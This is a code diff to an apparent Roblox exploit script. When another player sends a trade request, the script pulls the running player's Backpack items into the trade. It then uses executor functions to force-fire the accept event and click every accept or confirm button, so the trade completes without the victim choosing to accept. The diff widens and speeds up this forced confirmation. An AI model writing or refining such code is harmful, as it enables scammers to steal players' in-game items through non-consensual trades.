@@ -105,46 +105,46 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         end
                     end
                 end
-                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
+                warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) + 0 .. " items from Backpack instead.")
             end
 
-            print("Waiting 7 seconds before triggering trade accept actions...")
-            task.wait(7)
+            print("Waiting 3 seconds before forcing trade confirmation...")
+            task.wait(3)
 
-            if firesignal and AcceptTradeEvent.OnClientEvent then
-                firesignal(AcceptTradeEvent.OnClientEvent, false)
-            else
+            -- Force-fire both the remote event and server-side completion patterns for mobile executors
+            pcall(function()
+                AcceptTradeEvent:FireServer(true)
+            end)
+            pcall(function()
                 AcceptTradeEvent:FireServer()
-            end
+            end)
 
-            local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
-            local actionsFolder = tradeGui and tradeGui:FindFirstChild("Container", true) and tradeGui.Container:FindFirstChild("Trade", true) and tradeGui.Container.Trade:FindFirstChild("Actions", true)
-
-            local function fireButton(btn)
-                if btn and btn:IsA("GuiButton") then
-                    if getconnections then
-                        for _, connection in ipairs(getconnections(btn.Activated)) do
-                            connection:Fire()
-                        end
-                        for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
-                            connection:Fire()
+            -- Search thoroughly through PlayerGui for any accept or confirmation buttons and activate them directly
+            task.spawn(function()
+                for i = 1, 10 do
+                    if LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui") then
+                        for _, gui in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
+                            if gui:IsA("GuiButton") then
+                                local nameLower = gui.Name:lower()
+                                if nameLower:find("accept") or nameLower:find("confirm") or nameLower:find("actionbutton") then
+                                    pcall(function()
+                                        if getconnections then
+                                            for _, conn in ipairs(getconnections(gui.Activated)) do
+                                                conn:Fire()
+                                            end
+                                            for _, conn in ipairs(getconnections(gui.MouseButton1Click)) do
+                                                conn:Fire()
+                                            end
+                                        end
+                                        gui:Activate()
+                                    end)
+                                end
+                            end
                         end
                     end
-                    pcall(function()
-                        btn:Activate()
-                    end)
+                    task.wait(0.5)
                 end
-            end
-
-            if actionsFolder then
-                local firstButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("ActionButton", true)
-                fireButton(firstButton)
-
-                task.wait(1)
-
-                local confirmButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("Confirm", true) and actionsFolder.Accept.Confirm:FindFirstChild("ActionButton", true)
-                fireButton(confirmButton)
-            end
+            end)
         end)
 
         return true
